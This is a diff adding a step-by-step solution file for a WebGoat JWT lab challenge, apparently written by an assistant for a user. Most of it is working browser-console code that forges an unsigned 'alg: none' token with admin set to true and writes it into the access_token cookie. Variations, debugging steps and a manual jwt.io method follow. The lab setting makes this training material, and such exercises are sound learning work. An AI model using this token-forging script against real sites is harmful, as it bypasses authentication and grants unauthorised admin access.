@@ -1,0 +1,238 @@
+================================================================================
+  CHALLENGE 1: COPY-PASTE BROWSER CONSOLE SOLUTION
+  DO THIS RIGHT NOW IN YOUR BROWSER!
+================================================================================
+
+STEP 1: Get Your Current Token
+-------------------------------
+Press F12 > Application > Cookies > find "access_token" and copy the value
+
+STEP 2: Open Browser Console
+-----------------------------
+Press F12 > Console tab
+
+STEP 3: Copy and Paste This Script
+-----------------------------------
+(Replace YOUR_CURRENT_TOKEN with the token you copied)
+
+// ==================== START COPY HERE ====================
+
+// Paste your current access_token here:
+const currentToken = "YOUR_CURRENT_TOKEN";
+
+// Split the token
+const [header, payload, signature] = currentToken.split('.');
+
+// Decode the current payload to see what's in it
+const originalPayload = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+console.log("✓ Original payload:", originalPayload);
+
+// Create new payload with admin: true
+const newPayloadObj = {
+  ...originalPayload,
+  admin: "true"  // Change admin to true
+};
+
+// Create new header with algorithm "none"
+const noneHeader = btoa(JSON.stringify({alg: "none"}))
+  .replace(/\+/g, '-')
+  .replace(/\//g, '_')
+  .replace(/=/g, '');
+
+// Encode new payload
+const newPayload = btoa(JSON.stringify(newPayloadObj))
+  .replace(/\+/g, '-')
+  .replace(/\//g, '_')
+  .replace(/=/g, '');
+
+// Create attack token (algorithm "none", no signature, ends with dot)
+const attackToken = noneHeader + '.' + newPayload + '.';
+
+console.log("\n✓ Attack token created:");
+console.log(attackToken);
+
+// Set the cookie
+document.cookie = `access_token=${attackToken}; path=/`;
+
+console.log("\n✓ Cookie updated! Now:");
+console.log("1. Look for the 'Reset Votes' button on the page");
+console.log("2. Click it OR refresh the page");
+console.log("3. Challenge should complete!");
+
+// Verify the cookie was set
+setTimeout(() => {
+  const checkToken = document.cookie.split(';').find(c => c.includes('access_token'));
+  console.log("\n✓ Verification - Current cookie:", checkToken);
+}, 100);
+
+// ==================== END COPY HERE ====================
+
+================================================================================
+  ALTERNATIVE: ONE-LINE VERSION
+================================================================================
+
+If the above doesn't work, try this SUPER SIMPLE version:
+
+// Replace the token in quotes below:
+const t = "YOUR_TOKEN_HERE";
+const [h,p,s] = t.split('.');
+const d = JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));
+d.admin = "true";
+const nh = btoa('{"alg":"none"}').replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+const np = btoa(JSON.stringify(d)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+const at = nh+'.'+np+'.';
+document.cookie = `access_token=${at}; path=/`;
+console.log("Done! Click Reset Votes or refresh page");
+
+================================================================================
+  WHAT IF IT STILL DOESN'T WORK?
+================================================================================
+
+TRY THESE VARIATIONS:
+
+VARIATION 1: Admin as boolean (not string)
+-------------------------------------------
+Change this line:
+  admin: "true"  // string
+
+To this:
+  admin: true    // boolean (no quotes)
+
+VARIATION 2: Admin as "false" → "true" in lowercase
+----------------------------------------------------
+Make sure the value is the STRING "true", not boolean true
+
+VARIATION 3: Check the original payload structure
+--------------------------------------------------
+First, just decode and see what's there:
+
+const token = document.cookie.split('access_token=')[1].split(';')[0];
+const payload = token.split('.')[1];
+const decoded = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+console.log(decoded);
+
+Then match the EXACT structure when creating your attack token.
+
+VARIATION 4: Try without the trailing dot
+------------------------------------------
+Some servers don't want the trailing dot:
+
+Change:
+  const attackToken = noneHeader + '.' + newPayload + '.';
+To:
+  const attackToken = noneHeader + '.' + newPayload;
+
+================================================================================
+  DEBUGGING STEPS
+================================================================================
+
+1. CHECK IF COOKIE WAS SET:
+   document.cookie
+
+2. DECODE YOUR ATTACK TOKEN:
+   const at = document.cookie.split('access_token=')[1].split(';')[0];
+   const parts = at.split('.');
+   console.log("Header:", atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
+   console.log("Payload:", atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+
+3. VERIFY ALGORITHM IS "none":
+   Should show: {"alg":"none"}
+
+4. VERIFY ADMIN IS TRUE:
+   Should show: {..., "admin": "true", ...}
+
+5. VERIFY NO SIGNATURE (or just a dot):
+   console.log("Signature part:", parts[2]); // should be empty or undefined
+
+================================================================================
+  TROUBLESHOOTING CHECKLIST
+================================================================================
+
+□ Did you replace YOUR_CURRENT_TOKEN with actual token?
+□ Is the token you copied from access_token cookie (not Authorization header)?
+□ Did you paste the script in the CONSOLE tab (not Application tab)?
+□ Did you press Enter after pasting?
+□ Did you see "✓ Cookie updated!" message?
+□ Did you click "Reset Votes" button after running the script?
+□ Is the WebGoat page still open in the same tab?
+□ Try refreshing the page after setting the cookie
+□ Try clicking different user first, then reset
+
+================================================================================
+  EXACT EXAMPLE WITH REAL TOKEN
+================================================================================
+
+Here's an example using a token structure like yours:
+
+Original token:
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NjY1NTg5MTksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.SIGNATURE
+
+After algorithm "none" attack:
+eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NTg5MTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+
+Notice:
+- Header changed from eyJhbGciOiJIUzUxMiJ9 to eyJhbGciOiJub25lIn0
+- Payload changed "admin":"false" to "admin":"true"  
+- Signature removed (just a dot at the end)
+
+================================================================================
+  IF NOTHING WORKS - TRY THIS MANUAL METHOD
+================================================================================
+
+1. Go to: https://jwt.io
+
+2. Paste your current token in the "Encoded" box
+
+3. In the "PAYLOAD: DATA" section, change:
+   "admin": "false"  →  "admin": "true"
+
+4. In the "HEADER" section, change:
+   "alg": "HS512"  →  "alg": "none"
+
+5. In the "Encoded" section, you'll see the new token
+
+6. IMPORTANT: Remove the signature part!
+   If token is: header.payload.signature
+   Change to: header.payload.
+
+7. Copy the modified token
+
+8. In browser console:
+   document.cookie = 'access_token=MODIFIED_TOKEN_HERE; path=/';
+
+9. Click "Reset Votes"
+
+================================================================================
+  LAST RESORT - MAYBE CHALLENGE NEEDS DIFFERENT APPROACH
+================================================================================
+
+Some WebGoat JWT challenges want you to:
+
+1. Submit the token to an INPUT FIELD on the page (not just replace cookie)
+2. Call a specific API endpoint with the token
+3. Perform multiple steps in sequence
+
+LOOK AT THE CHALLENGE PAGE CAREFULLY:
+- Is there a text box where you should paste the token?
+- Is there a "Submit Token" button?
+- Are there multiple steps/buttons to click?
+
+IF YOU SEE AN INPUT FIELD:
+Just paste your algorithm "none" token directly there and click Submit!
+
+================================================================================
+  READY TO TRY?
+================================================================================
+
+1. Copy the script from "START COPY HERE" to "END COPY HERE"
+2. Replace YOUR_CURRENT_TOKEN with your actual token
+3. Paste in browser console
+4. Press Enter
+5. Click "Reset Votes" or refresh
+6. ✓ Done!
+
+If it still doesn't work, tell me:
+- What error message do you see?
+- What does the console output show?
+- Is there an input field on the challenge page?
+- What happens when you click "Reset Votes"?
